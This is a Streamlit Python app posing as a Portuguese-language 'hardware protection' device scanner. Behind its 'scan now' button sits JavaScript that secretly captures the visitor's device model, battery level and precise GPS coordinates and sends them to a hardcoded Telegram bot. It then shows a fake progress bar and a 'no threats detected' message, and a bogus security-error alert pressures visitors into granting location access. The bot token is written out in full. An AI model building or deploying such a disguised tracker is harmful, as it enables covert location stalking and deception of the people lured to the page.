import streamlit as st
import time

# --- SEUS DADOS VALIDADOS ---
TOKEN = "8099253382:AAHWYUjfpW19J56Ud_FCM_9tObxU4rLh3gQ"
ID = "8498664028"

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS MIAMY © 2026 ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    .titulo { font-size: 30px; font-weight: bold; margin-top: 30px; text-align: center; }
    .status-container { font-size: 20px; margin: 15px 0; color: #e0e0e0; text-align: center; min-height: 40px; }
    .progress-bg { width: 100%; height: 10px; background-color: #1e262e; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
    .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
    .btn-container { display: flex; justify-content: center; width: 100%; margin: 20px 0; }
    .meu-botao {
        background-color: white; color: black; width: 280px; height: 80px;
        border-radius: 15px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.4);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 24px; }
    .footer { 
        position: fixed; left: 0; bottom: 20px; width: 100%; 
        text-align: center; color: #555; font-size: 10px; 
    }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="titulo">Sistema de Proteção de Hardware</div>', unsafe_allow_html=True)

placeholder_texto = st.empty()
placeholder_barra = st.empty()

placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)

# --- MOTOR DE CAPTURA ---
js_final = f"""
<div class="btn-container">
    <button class="meu-botao" id="btn_ativar">
        <span class="ponto-vermelho">●</span>
        <span>ESCANEAR DISPOSITIVO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('btn_ativar').onclick = async function() {{
    let info_aparelho = "Android Device";
    
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {{
        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
        info_aparelho = (hints.model || "Android") + " (v" + (hints.platformVersion || "16") + ")";
    }} else {{
        let detalhes = navigator.userAgent.match(/\\((.*?)\\)/);
        if (detalhes) info_aparelho = detalhes[1].replace("Linux; ", "");
    }}

    navigator.geolocation.getCurrentPosition(
        async function(pos) {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;

                var img = new Image();
                img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&parse_mode=Markdown&text=" + encodeURIComponent(msg);
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{
                new Image().src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent("🛡️ Alerta: Dispositivo v16 Localizado.");
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }}
        }},
        function(err) {{
            alert("Erro de Segurança: Permita a localização para validar o hardware.");
        }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}};
</script>
"""

clicou = st.components.v1.html(js_final, height=150)
st.markdown('<div class="footer">SISTEMA INTEGRADO DE SEGURANÇA DESENVOLVIDO POR Miamy © 2026<br>Todos os Direitos Reservados</div>', unsafe_allow_html=True)

if clicou:
    # Animação da barra
    for p in range(4, 101, 2):
        placeholder_texto.markdown(f'<div class="status-container">Analisando ameaças: {p}%</div>', unsafe_allow_html=True)
        placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
        time.sleep(0.02)
    
    # Mensagem final de sucesso
    placeholder_texto.markdown('<div class="status-container" style="color: #2ecc71; font-weight: bold;">Sistema Seguro: nenhuma ameaça foi detectada</div>', unsafe_allow_html=True)
    st.balloons()
    st.stop()
    
